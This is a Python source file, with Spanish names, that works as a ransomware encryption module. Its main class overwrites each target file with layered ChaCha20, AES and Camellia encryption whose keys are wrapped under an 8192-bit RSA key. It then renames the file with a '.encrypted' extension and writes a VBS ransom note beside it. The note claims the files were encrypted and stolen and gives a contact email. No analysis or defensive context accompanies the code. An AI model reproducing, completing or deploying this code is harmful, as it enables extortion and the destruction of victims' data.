import os
import secrets
import hashlib
import hmac
import struct
import base64


def _import_crypto():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import padding as pad_module
        from cryptography.hazmat.backends import default_backend
        
        return {
            'Cipher': Cipher,
            'algorithms': algorithms,
            'modes': modes,
            'hashes': hashes,
            'serialization': serialization,
            'rsa': rsa,
            'padding': padding,
            'HKDF': HKDF,
            'pad_module': pad_module,
            'backend': default_backend()
        }
    except ImportError:
        return None


errores_detallados = []

def agregar_error(tipo, ruta, detalle=""):
    errores_detallados.append(f"[{tipo}] {ruta} - {detalle}")


def crear_vbs_notificacion(ruta_archivo):
    try:
        nombre_base = os.path.splitext(ruta_archivo)[0]
        vbs_path = nombre_base + ".vbs"
        
        vbs_content = """On Error Resume Next
MsgBox "Your files, database, and other information have been encrypted and stolen. To recover them, please use the following email address:" & vbCrLf & vbCrLf & "onder01@tutamail.com", vbCritical + vbOKOnly, "Archivos Cifrados"
WScript.Quit
"""
                
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_content)
        
        return True
    except:
        return False


class EncriptadorMilitar:
    TAMANO_PEQUENO = 1 * 1024 * 1024
    TAMANO_MEDIANO = 10 * 1024 * 1024
    TAMANO_GRANDE = 50 * 1024 * 1024
    
    def __init__(self):
        self.crypto = _import_crypto()
        if not self.crypto:
            raise ImportError("Cryptography no disponible")
        
        self.ext = ".encrypted"
        self._init_keys()
        self._init_entropy_pool()
        
        self.stats = {
            '12_capas': 0,
            '8_capas': 0,
            '5_capas': 0,
            '3_capas': 0
        }
    
    def _init_keys(self):
        self.master_key = self.crypto['rsa'].generate_private_key(
            public_exponent=65537,
            key_size=8192,
            backend=self.crypto['backend']
        )
        self.public_key = self.master_key.public_key()
        
        password = secrets.token_bytes(256)
        pem = self.master_key.private_bytes(
            encoding=self.crypto['serialization'].Encoding.PEM,
            format=self.crypto['serialization'].PrivateFormat.PKCS8,
            encryption_algorithm=self.crypto['serialization'].BestAvailableEncryption(password)
        )
        
        with open("llave.key", "wb") as f:
            f.write(pem)
        
        with open("MASTER_PASSWORD.txt", "wb") as f:
            f.write(base64.b85encode(password))
    
    def _init_entropy_pool(self):
        self.entropy_pool = bytearray(secrets.token_bytes(4096))
    
    def _get_entropy(self, size):
        new_entropy = secrets.token_bytes(size)
        for i in range(size):
            self.entropy_pool[i % len(self.entropy_pool)] ^= new_entropy[i]
        h = hashlib.blake2b(bytes(self.entropy_pool), digest_size=size)
        return h.digest()
    
    def _derive_key(self, master, salt, info, length=32):
        kdf = self.crypto['HKDF'](
            algorithm=self.crypto['hashes'].SHA3_512(),
            length=length,
            salt=salt,
            info=info,
            backend=self.crypto['backend']
        )
        return kdf.derive(master)
    
    def _poly1305_mac(self, key, data):
        h = hashlib.blake2b(key + data, digest_size=16)
        return h.digest()
    
    def _determinar_capas(self, tamano):
        if tamano < self.TAMANO_PEQUENO:
            return 12, '12_capas'
        elif tamano < self.TAMANO_MEDIANO:
            return 8, '8_capas'
        elif tamano < self.TAMANO_GRANDE:
            return 5, '5_capas'
        else:
            return 3, '3_capas'
    
    def _flatten_keys(self, claves_usadas):
        result = b''
        for item in claves_usadas:
            if isinstance(item, bytes):
                result += item
            elif isinstance(item, tuple):
                for subitem in item:
                    if isinstance(subitem, bytes):
                        result += subitem
        return result
    
    def encriptar(self, ruta):
        try:
            if not os.path.exists(ruta) or ruta.endswith(self.ext):
                return False
            
            try:
                tamano = os.path.getsize(ruta)
                with open(ruta, 'rb') as f:
                    datos = f.read()
            except:
                agregar_error("LECTURA", ruta)
                return False
            
            num_capas, tipo_capas = self._determinar_capas(tamano)
            self.stats[tipo_capas] += 1
            
            file_master = self._get_entropy(64)
            claves_usadas = []
            
            xor_key = self._derive_key(file_master, b'xor_layer', b'initial_obfuscation', 32)
            datos = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(datos))
            claves_usadas.append(xor_key)
            
            key_c1 = self._get_entropy(32)
            nonce_c1 = self._get_entropy(16)
            cipher_c1 = self.crypto['Cipher'](
                self.crypto['algorithms'].ChaCha20(key_c1, nonce_c1),
                mode=None,
                backend=self.crypto['backend']
            )
            datos = cipher_c1.encryptor().update(datos)
            mac_c1 = self._poly1305_mac(key_c1, datos)
            claves_usadas.extend([key_c1, nonce_c1, mac_c1])
            
            key_s = self._get_entropy(32)
            nonce_s = self._get_entropy(16)
            cipher_s = self.crypto['Cipher'](
                self.crypto['algorithms'].ChaCha20(key_s, nonce_s),
                mode=None,
                backend=self.crypto['backend']
            )
            datos = cipher_s.encryptor().update(datos)
            claves_usadas.extend([key_s, nonce_s])
            
            if num_capas >= 5:
                key_a1 = self._get_entropy(32)
                nonce_a1 = self._get_entropy(12)
                cipher_a1 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a1),
                    self.crypto['modes'].GCM(nonce_a1),
                    backend=self.crypto['backend']
                )
                enc_a1 = cipher_a1.encryptor()
                datos = enc_a1.update(datos) + enc_a1.finalize()
                tag_a1 = enc_a1.tag
                claves_usadas.extend([key_a1, nonce_a1, tag_a1])
                
                try:
                    key_cam = self._get_entropy(32)
                    nonce_cam = self._get_entropy(16)
                    cipher_cam = self.crypto['Cipher'](
                        self.crypto['algorithms'].Camellia(key_cam),
                        self.crypto['modes'].CTR(nonce_cam),
                        backend=self.crypto['backend']
                    )
                    datos = cipher_cam.encryptor().update(datos)
                except:
                    key_cam = self._get_entropy(32)
                    nonce_cam = self._get_entropy(16)
                    cipher_cam = self.crypto['Cipher'](
                        self.crypto['algorithms'].AES(key_cam),
                        self.crypto['modes'].CTR(nonce_cam),
                        backend=self.crypto['backend']
                    )
                    datos = cipher_cam.encryptor().update(datos)
                claves_usadas.extend([key_cam, nonce_cam])
            
            if num_capas >= 8:
                key_a2 = self._get_entropy(32)
                iv_a2 = self._get_entropy(16)
                
                padder = self.crypto['pad_module'].PKCS7(128).padder()
                datos_padded = padder.update(datos) + padder.finalize()
                
                cipher_a2 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a2),
                    self.crypto['modes'].CBC(iv_a2),
                    backend=self.crypto['backend']
                )
                datos = cipher_a2.encryptor().update(datos_padded)
                claves_usadas.extend([key_a2, iv_a2])
                
                key_tw = self._get_entropy(32)
                nonce_tw = self._get_entropy(16)
                for _ in range(3):
                    cipher_tw = self.crypto['Cipher'](
                        self.crypto['algorithms'].AES(key_tw),
                        self.crypto['modes'].CTR(nonce_tw),
                        backend=self.crypto['backend']
                    )
                    datos = cipher_tw.encryptor().update(datos)
                claves_usadas.extend([key_tw, nonce_tw])
                
                serpent_key = self._get_entropy(32)
                chunk_size = min(64, len(datos))
                for i in range(0, len(datos), chunk_size):
                    chunk = datos[i:i+chunk_size]
                    h = hashlib.blake2b(serpent_key + chunk, digest_size=len(chunk))
                    datos = datos[:i] + bytes(a ^ b for a, b in zip(chunk, h.digest())) + datos[i+len(chunk):]
                claves_usadas.append(serpent_key)
            
            if num_capas >= 12:
                blake_key = self._get_entropy(64)
                h = hashlib.blake2b(blake_key + datos, digest_size=64)
                datos = h.digest() + datos
                claves_usadas.append(blake_key)
                
                key_c2 = self._get_entropy(32)
                nonce_c2 = self._get_entropy(16)
                cipher_c2 = self.crypto['Cipher'](
                    self.crypto['algorithms'].ChaCha20(key_c2, nonce_c2),
                    mode=None,
                    backend=self.crypto['backend']
                )
                datos = cipher_c2.encryptor().update(datos)
                claves_usadas.extend([key_c2, nonce_c2])
                
                key_a3 = self._get_entropy(32)
                nonce_a3 = self._get_entropy(16)
                cipher_a3 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a3),
                    self.crypto['modes'].CTR(nonce_a3),
                    backend=self.crypto['backend']
                )
                datos = cipher_a3.encryptor().update(datos)
                claves_usadas.extend([key_a3, nonce_a3])
            
            claves_flat = self._flatten_keys(claves_usadas)
            key_bundle = num_capas.to_bytes(1, 'big') + file_master + claves_flat
            
            encrypted_keys = self.public_key.encrypt(
                key_bundle,
                self.crypto['padding'].OAEP(
                    mgf=self.crypto['padding'].MGF1(algorithm=self.crypto['hashes'].SHA512()),
                    algorithm=self.crypto['hashes'].SHA512(),
                    label=None
                )
            )
            
            hmac_key = self._get_entropy(64)
            h = hmac.new(hmac_key, encrypted_keys + datos, hashlib.sha3_512)
            firma = h.digest()
            
            resultado = (
                struct.pack('>I', len(encrypted_keys)) +
                encrypted_keys +
                datos +
                hmac_key +
                firma
            )
            
            try:
                with open(ruta, 'wb') as f:
                    f.write(resultado)
                nueva_ruta = ruta + self.ext
                os.rename(ruta, nueva_ruta)
                
                crear_vbs_notificacion(nueva_ruta)
                
                return True
            except:
                agregar_error("ESCRITURA", ruta)
                return False
                
        except Exception as e:
            agregar_error("ERROR_GENERAL", ruta, str(e))
            return False
    
    def obtener_estadisticas(self):
        return self.stats


Encriptador = EncriptadorMilitar


def guardar_log_errores():
    try:
        with open("encryption_debug.log", "w", encoding="utf-8") as f:
            f.write("="*70 + "\\n")
            f.write("LOG DE ERRORES\\n")
            f.write("="*70 + "\\n\\n")
            f.write(f"Total errores: {len(errores_detallados)}\\n\\n")
            
            for error in errores_detallados:
                f.write(error + "\\n")
    except:
        pass


CRYPTO_OK = _import_crypto() is not None
